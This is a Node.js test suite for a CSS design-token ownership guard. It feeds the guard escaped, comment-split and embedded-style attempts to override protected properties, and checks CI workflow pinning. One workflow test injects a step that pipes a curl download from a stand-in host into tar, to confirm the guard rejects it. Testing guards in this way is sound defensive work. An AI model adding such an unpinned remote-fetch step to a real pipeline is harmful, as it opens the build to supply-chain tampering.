import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import ts from "typescript";
import {
  collectEmbeddedStyleSources,
  collectCssFiles,
  extractEmbeddedStyleSources,
  materialOwnershipErrors,
  parseCssDeclarations as guardParser,
  parseCssDefinitions,
  parseCssPropertyRegistrations,
  protectedMaterialTokens,
  protectedRegistrationErrors,
  timeOfDayCanvasOwnerErrors,
  workflowIntegrityErrors,
} from "../packages/champagne-guards/scripts/guard-surface-semantics.mjs";
import { unwrapStaticTypeScriptExpression } from "../packages/champagne-guards/scripts/surface-semantics-contract.v1.mjs";
import { parseCssDeclarations as sharedParser } from "../packages/champagne-tokens/scripts/css-declarations.v1.mjs";
import {
  GENERATED_CSS_RELATIVE_PATH as GC,
  GENERATED_TS_RELATIVE_PATH as GT,
  PRIMITIVES_RELATIVE_PATH as PR,
  SOURCE_RELATIVE_PATH as SR,
  checkGenerated,
  renderMaterial,
  stableStringify,
  writeGenerated,
} from "../packages/champagne-tokens/scripts/generate-critical-paint.v1.mjs";

const root = path.resolve(import.meta.dirname, "..");
const read = (file) => readFile(path.join(root, file), "utf8");
const source = JSON.parse(await read(SR));
const primitive = await read(PR);
const generated = await read(GC);
const tokens = await read("packages/champagne-tokens/styles/champagne/tokens.css");
const timeCss = await read("packages/champagne-tokens/styles/champagne/time-of-day.css");
const workflow = await read(".github/workflows/verify.yml");
const rendered = renderMaterial(source, primitive);
const protectedTokens = protectedMaterialTokens(source, rendered);
const clone = (value) => JSON.parse(JSON.stringify(value));
const escaped = (token) => `--\\${token[2].codePointAt(0).toString(16)} ${token.slice(3)}`;
const split = (token) => `${token.slice(0, 3)}/**/${token.slice(3)}`;
const baseline = (extra = []) => new Map([
  ["packages/champagne-tokens/styles/tokens/smh-champagne-tokens.css", primitive],
  ["packages/champagne-tokens/styles/champagne/canvas-material.generated.css", generated],
  ["packages/champagne-tokens/styles/champagne/tokens.css", tokens],
  ["packages/champagne-tokens/styles/champagne/time-of-day.css", timeCss],
  ...extra,
]);
const ownership = (css) => materialOwnershipErrors({
  cssSources: baseline([["apps/web/app/adversarial.module.css", css]]),
  materialSource: source,
  renderedMaterial: rendered,
}).join("\n");
const embeddedOwnership = (tsx, sourcePath = "apps/web/app/Adversarial.tsx") => {
  const styles = extractEmbeddedStyleSources(tsx, sourcePath);
  return {
    styles,
    issues: materialOwnershipErrors({
      cssSources: baseline([...styles]),
      materialSource: source,
      renderedMaterial: rendered,
    }).join("\n"),
  };
};

async function tempRepo(sourceValue = source, primitiveValue = primitive) {
  const dir = await mkdtemp(path.join(tmpdir(), "champagne-critical-paint-"));
  for (const file of [SR, PR, GC, GT]) await mkdir(path.dirname(path.join(dir, file)), { recursive: true });
  await writeFile(path.join(dir, SR), `${JSON.stringify(sourceValue, null, 2)}\n`);
  await writeFile(path.join(dir, PR), primitiveValue);
  return dir;
}

test("current material renders byte-stable loaded and critical outputs", () => {
  const first = renderMaterial(source, primitive);
  const second = renderMaterial(clone(source), primitive);
  assert.equal(first.css, second.css);
  assert.equal(first.ts, second.ts);
  assert.match(first.css, /--surface-canvas: var\(--brand-ink\)/);
  assert.match(first.ts, /export const champagneCriticalPaintCss/);
  assert.doesNotMatch(first.ts, /\bimport\s|\brequire\s*\(/);
  assert.deepEqual(first.documentStyle, {
    background: "var(--surface-canvas)",
    color: "var(--text-ink-high)",
  });
  assert.equal(Object.keys(first.documentStyle).some((key) => key.startsWith("--")), false);
});

test("semantic source changes alter both generated outputs", () => {
  const changed = clone(source);
  const canvas = changed.nodes.find((node) => node.id === "canvas");
  canvas.left.weight = 91;
  canvas.right.weight = 9;
  const before = renderMaterial(source, primitive);
  const after = renderMaterial(changed, primitive);
  assert.notEqual(after.css, before.css);
  assert.notEqual(after.ts, before.ts);
});

test("closed schema rejects unknown keys", () => {
  const changed = clone(source);
  changed.unexpected = true;
  assert.throws(() => renderMaterial(changed, primitive), /unknown key/);
});

test("material status and final-selection truth fail closed together", () => {
  const status = clone(source);
  status.status = "FINAL_PERSIAN_MIDNIGHT_SELECTED";
  assert.throws(() => renderMaterial(status, primitive), /MATERIAL_STATUS/);
  const selection = clone(source);
  selection.finalPersianMidnightSelection = true;
  assert.throws(() => renderMaterial(selection, primitive), /PERSIAN_MIDNIGHT_AUTHORITY/);
});

test("shared CSS parser authority remains a single implementation", () => {
  assert.equal(guardParser, sharedParser);
});

test("BROWSER_EFFECTIVE_OWNER: direct and escaped declarations are decoded", () => {
  const cases = [
    ":root{--surface-canvas:var(--surface-1)}",
    String.raw`:root{--surface-\63 anvas:var(--surface-1)}`,
    String.raw`:root{--\73 urface-canvas:var(--surface-1)}`,
    String.raw`:root{--surface\2d canvas:var(--surface-1)}`,
  ];
  for (const css of cases) {
    assert.deepEqual(parseCssDefinitions(css, "--surface-canvas"), ["var(--surface-1)"]);
  }
});

test("BROWSER_INVALID_SYNTAX: comment-separated names are conservatively rejected", () => {
  const css = ":root{--surface/**/-canvas:var(--surface-1)}";
  assert.deepEqual(parseCssDefinitions(css, "--surface-canvas"), ["var(--surface-1)"]);
  assert.match(ownership(css), /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("matched brace components and escaped closing braces cannot hide a later owner", () => {
  assert.deepEqual(
    parseCssDefinitions(":root{--decoy:{x:y};--surface-canvas:var(--surface-1)}", "--surface-canvas"),
    ["var(--surface-1)"],
  );
  assert.deepEqual(
    parseCssDefinitions(String.raw`:root{--decoy:{x:\};};--surface-canvas:var(--surface-1)}`, "--surface-canvas"),
    ["var(--surface-1)"],
  );
});

test("bad-string newline recovery cannot swallow a following owner", () => {
  assert.deepEqual(
    parseCssDefinitions(`:root{--decoy:"bad\n;--surface-canvas:var(--surface-1);/* " */}`, "--surface-canvas"),
    ["var(--surface-1)"],
  );
});

test("CONSERVATIVE_PARSER_REJECTION: malformed CSS fails closed", () => {
  assert.throws(
    () => sharedParser(":root{--decoy:calc((1px);}"),
    /unbalanced CSS component value|unbalanced CSS block/,
  );
  assert.match(ownership(":root{--surface-canvas:var(--surface-1);"), /CSS_DECLARATION_PARSE/);
  assert.match(ownership(":root{--surface-canvas:red;/*"), /CSS_DECLARATION_PARSE/);
});

test("every protected owner rejects direct, escaped and comment-separated competitors", () => {
  for (const token of protectedTokens) {
    for (const spelling of [token, escaped(token), split(token)]) {
      const issues = ownership(`:root{${spelling}:var(--surface-1)}`);
      assert.match(issues, new RegExp(`MATERIAL_OWNER_UNAPPROVED.*${token}`));
      assert.match(issues, /adversarial\.module\.css/);
    }
  }
});

test("literal primitives preserve exact ownership and parity", () => {
  const escapedOnly = primitive.replace("--ink:  #0B0D0F;", `${escaped("--ink")}: #0B0D0F;`);
  assert.notEqual(escapedOnly, primitive);
  assert.doesNotThrow(() => renderMaterial(source, escapedOnly));
  for (const node of source.nodes.filter((item) => item.type === "literal")) {
    const duplicate = `${primitive}\n:root{${escaped(node.token)}:${node.value}}`;
    assert.throws(
      () => renderMaterial(source, duplicate),
      (error) => error instanceof Error && error.message.includes(`[PRIMITIVE_OWNER_INVALID] ${node.token}`),
    );
  }
  assert.throws(() => renderMaterial(source, primitive.replace("#40C4B4", "#40C4B5")), /PRIMITIVE_DRIFT/);
});

test("generated owners, ink-100 and immutable gold remain in the protected set", () => {
  for (const token of [
    "--smh-ink-navy",
    "--brand-ink",
    "--surface-canvas",
    "--bg-ink",
    "--text-ink-high",
    "--ink-100",
    "--brand-gold",
    "--brand-gold-keyline",
  ]) {
    assert.equal(protectedTokens.has(token), true, token);
  }
});

test("only the three exact time-of-day canvas owners are accepted", () => {
  assert.deepEqual(timeOfDayCanvasOwnerErrors(timeCss), []);
  assert.match(
    timeOfDayCanvasOwnerErrors(`${timeCss}\n:root{--surface-canvas:var(--surface-1)}`).join("\n"),
    /TIME_OF_DAY_CANVAS_OWNERS/,
  );
  assert.match(
    timeOfDayCanvasOwnerErrors(`${timeCss}\n:root[data-theme='night']{--surface-canvas:var(--ink-100)}`).join("\n"),
    /TIME_OF_DAY_CANVAS_OWNERS/,
  );
});

test("protected @property registrations are inventoried through nested at-rules", () => {
  const cases = [
    "@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}",
    String.raw`@property --\73 urface-canvas{syntax:'<color>';inherits:false;initial-value:red}`,
    String.raw`@property --surface-\63 anvas{syntax:'<color>';inherits:false;initial-value:red}`,
    "@layer material{@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
    "@supports(display:grid){@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
    "@media(min-width:1px){@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}}",
  ];
  for (const css of cases) {
    const registrations = parseCssPropertyRegistrations(css);
    assert.equal(registrations[0]?.property, "--surface-canvas");
    const issues = protectedRegistrationErrors(
      new Map([["apps/web/app/adversarial.css", css]]),
      protectedTokens,
    ).join("\n");
    assert.match(issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
  }
});

test("ambiguous or malformed protected registrations fail closed", () => {
  const ambiguous = "@property --surface/**/-canvas{syntax:'<color>';inherits:false;initial-value:red}";
  assert.match(
    protectedRegistrationErrors(new Map([["x.css", ambiguous]]), protectedTokens).join("\n"),
    /MATERIAL_REGISTRATION_UNAPPROVED.*ambiguous spelling/,
  );
  assert.match(
    protectedRegistrationErrors(new Map([["x.css", "@property --surface-canvas;"]]), protectedTokens).join("\n"),
    /CSS_REGISTRATION_PARSE/,
  );
});

test("unprotected @property registrations remain permitted", () => {
  const css = "@property --component-progress{syntax:'<number>';inherits:false;initial-value:0}";
  assert.deepEqual(protectedRegistrationErrors(new Map([["x.css", css]]), protectedTokens), []);
});

test("benign ordinary embedded styles preserve provenance and pass ownership", () => {
  const result = embeddedOwnership(
    "const View = () => <style>{`.safe{color:var(--text-high)}`}</style>;",
    "apps/web/app/Benign.tsx",
  );
  assert.equal(result.styles.size, 1);
  const [[provenance, css]] = [...result.styles];
  assert.match(provenance, /^apps\/web\/app\/Benign\.tsx:\d+:\d+ <style>$/);
  assert.equal(css, ".safe{color:var(--text-high)}");
  assert.equal(result.issues, "");
  assert.throws(
    () => extractEmbeddedStyleSources("const View = () => <style>{`broken`}</style", "Broken.tsx"),
    /\[EMBEDDED_STYLE_SOURCE_PARSE\] Broken\.tsx:/,
  );
});

test("ordinary embedded styles reject protected material owners", () => {
  const result = embeddedOwnership(
    "const View = () => <style>{`:root{--surface-canvas:red}`}</style>;",
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  assert.match(result.issues, /Adversarial\.tsx:\d+:\d+ <style>/);
});

test("dangerouslySetInnerHTML embedded styles reject protected material owners", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{__html: ":root{--bg-ink:red}"}} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--bg-ink/);
});

test("embedded styles reject escaped protected material owners", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{__html: ":root{--surface-\\\\63 anvas:red}"}} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("embedded styles reject comment-separated protected material owners", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{__html: ":root{--surface/**/-canvas:red}"}} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("embedded styles reject protected property registrations", () => {
  const result = embeddedOwnership(
    "const View = () => <style>{`@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}`}</style>;",
  );
  assert.match(result.issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
});

test("static embedded property names remain governed across dynamic template values", () => {
  const result = embeddedOwnership(
    "const color = 'red'; const View = () => <style>{`:root{--surface-canvas:${color}}`}</style>;",
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
  assert.match([...result.styles.values()][0], /var\(--champagne-embedded-style-expression\)/);
});

test("parenthesized dangerous style objects remain governed", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={({ __html: ":root{--surface-canvas:red}" })} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("dangerous style objects wrapped with as expressions remain governed", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={({ __html: ":root{--surface-canvas:red}" }) as any} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("dangerous style objects wrapped with satisfies preserve protected registrations", () => {
  const result = embeddedOwnership(
    "const View = () => <style dangerouslySetInnerHTML={{ __html: \"@property --surface-canvas{syntax:'<color>';inherits:false;initial-value:red}\" } satisfies { __html: string }} />;",
  );
  assert.match(result.issues, /MATERIAL_REGISTRATION_UNAPPROVED.*--surface-canvas/);
});

test("angle-bracket type assertions unwrap in TypeScript expression syntax", () => {
  const sourceFile = ts.createSourceFile(
    "assertion.ts",
    'const css = <string>":root{--surface-canvas:red}";',
    ts.ScriptTarget.Latest,
    true,
    ts.ScriptKind.TS,
  );
  assert.equal(sourceFile.parseDiagnostics.length, 0);
  const statement = sourceFile.statements[0];
  assert.equal(ts.isVariableStatement(statement), true);
  const expression = statement.declarationList.declarations[0]?.initializer;
  const normalized = unwrapStaticTypeScriptExpression(expression);
  assert.equal(ts.isStringLiteral(normalized), true);
  assert.match(ownership(normalized.text), /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("nested transparent wrappers on ordinary style children remain governed", () => {
  const result = embeddedOwnership(
    "const View = () => <style>{((`:root{--surface-canvas:red}` as const) satisfies string)!}</style>;",
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("wrapped __html string values remain governed", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={{ __html: (":root{--surface-canvas:red}" as const) }} />;',
  );
  assert.match(result.issues, /MATERIAL_OWNER_UNAPPROVED.*--surface-canvas/);
});

test("benign wrapped embedded CSS remains permitted", () => {
  const result = embeddedOwnership(
    'const View = () => <style dangerouslySetInnerHTML={(({ __html: ".safe{color:var(--text-high)}" } satisfies { __html: string }) as { __html: string })!} />;',
  );
  assert.equal(result.styles.size, 1);
  assert.equal(result.issues, "");
});

test("dynamic embedded expressions remain outside the claim and are not executed", () => {
  delete globalThis.__champagneStyleExecuted;
  const result = embeddedOwnership(
    "const View = () => <style dangerouslySetInnerHTML={(globalThis.__champagneStyleExecuted = true, { __html: ':root{--surface-canvas:red}' })} />;",
  );
  assert.equal(result.styles.size, 0);
  assert.equal(result.issues, "");
  assert.equal(globalThis.__champagneStyleExecuted, undefined);
});

test("current first-party embedded style blocks pass without false positives", () => {
  const styles = new Map([
    ...collectEmbeddedStyleSources(path.join(root, "apps/web/app"), root),
    ...collectEmbeddedStyleSources(path.join(root, "packages"), root),
  ]);
  assert.equal(styles.size >= 7, true);
  assert.equal(
    materialOwnershipErrors({
      cssSources: baseline([...styles]),
      materialSource: source,
      renderedMaterial: rendered,
    }).join("\n"),
    "",
  );
});

test("protected CSS and embedded-style trees reject file and directory symlinks", async (t) => {
  const dir = await mkdtemp(path.join(tmpdir(), "champagne-css-symlink-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const fileTree = path.join(dir, "file-tree");
  const nested = path.join(fileTree, "nested");
  await mkdir(nested, { recursive: true });
  await writeFile(path.join(fileTree, "owner.css"), ":root{--surface-canvas:var(--surface-1)}\n");
  await symlink("../owner.css", path.join(nested, "linked.module.css"), "file");
  assert.throws(
    () => collectCssFiles(fileTree, fileTree),
    /\[CSS_SYMLINK_UNAPPROVED\] nested[\\/]linked\.module\.css/,
  );
  const directoryTree = path.join(dir, "directory-tree");
  const real = path.join(directoryTree, "real");
  await mkdir(real, { recursive: true });
  await writeFile(path.join(real, "owner.css"), ":root{--ink:#000000}\n");
  await symlink("real", path.join(directoryTree, "linked"), "dir");
  assert.throws(() => collectCssFiles(directoryTree, directoryTree), /\[CSS_SYMLINK_UNAPPROVED\] linked/);
  const embeddedTree = path.join(dir, "embedded-tree");
  await mkdir(embeddedTree, { recursive: true });
  await writeFile(path.join(embeddedTree, "owner.tsx"), "export const View = () => <style>{`.safe{color:red}`}</style>;\n");
  await symlink("owner.tsx", path.join(embeddedTree, "linked.tsx"), "file");
  assert.throws(
    () => collectEmbeddedStyleSources(embeddedTree, embeddedTree),
    /\[EMBEDDED_STYLE_SYMLINK_UNAPPROVED\] linked\.tsx/,
  );
});

test("missing references and cycles fail deterministically", () => {
  const missing = clone(source);
  missing.outputs.canvas = "missingNode";
  assert.throws(() => renderMaterial(missing, primitive), /REF_MISSING/);
  const cyclic = clone(source);
  cyclic.nodes.find((node) => node.id === "canvas").left.ref = "canvas";
  assert.throws(() => renderMaterial(cyclic, primitive), /REF_CYCLE/);
});

test("transparent canvas output fails closed", () => {
  const transparent = clone(source);
  const node = transparent.nodes.find((item) => item.id === "transparent");
  node.id = "clear";
  transparent.outputs.canvas = "clear";
  assert.throws(() => renderMaterial(transparent, primitive), /CANVAS_OPACITY/);
});

test("write mode is deterministic and check mode detects manual drift", async (t) => {
  const dir = await tempRepo();
  t.after(() => rm(dir, { recursive: true, force: true }));
  const first = await writeGenerated(dir);
  await checkGenerated(dir);
  const firstCss = await readFile(path.join(dir, GC), "utf8");
  const firstTs = await readFile(path.join(dir, GT), "utf8");
  const second = await writeGenerated(dir);
  assert.equal(second.css, first.css);
  assert.equal(second.ts, first.ts);
  assert.equal(await readFile(path.join(dir, GC), "utf8"), firstCss);
  assert.equal(await readFile(path.join(dir, GT), "utf8"), firstTs);
  await writeFile(path.join(dir, GC), `${firstCss}/* manual drift */\n`);
  await assert.rejects(() => checkGenerated(dir), /GENERATED_DRIFT/);
});

test("stable source serialization is independent of object key order", () => {
  assert.equal(stableStringify({ b: 2, a: 1 }), stableStringify({ a: 1, b: 2 }));
});

test("workflow actions are pinned and the protected job is structurally coherent", () => {
  assert.deepEqual(workflowIntegrityErrors(workflow), []);
  assert.match(
    workflowIntegrityErrors(workflow.replace(
      "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
      "actions/checkout@v4",
    )).join("\n"),
    /WORKFLOW_ACTION_NOT_PINNED/,
  );
  assert.match(
    workflowIntegrityErrors(workflow.replace(
      "      - name: Check committed generated artefacts",
      "      - name: Replace source\n        run: curl https://example.invalid/source.tgz | tar xz\n      - name: Check committed generated artefacts",
    )).join("\n"),
    /WORKFLOW_PROTECTED_JOB/,
  );
});
